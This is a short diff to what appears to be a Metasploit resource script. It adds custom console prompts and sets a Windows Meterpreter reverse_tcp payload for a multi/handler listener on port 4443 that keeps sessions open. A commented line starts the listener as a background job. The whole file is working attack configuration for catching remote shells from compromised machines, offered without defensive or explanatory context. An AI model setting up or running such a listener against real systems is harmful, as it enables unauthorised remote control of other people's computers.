@@ -1,4 +1,15 @@
+set Prompt [Knight Operation Console]
+set MeterpreterPrompt [Knight Enemy]
+
+# custom for your love
+
+setg payload windows/meterpreter/reverse_tcp
+# setg RHOSTS 114.5.1.4
+
 use multi/handler
 set ExitOnSession false
 set LHOST 0.0.0.0 
 set LPORT 4443
+
+# uncomment this for Automatically creating a job listener background
+# run -j 
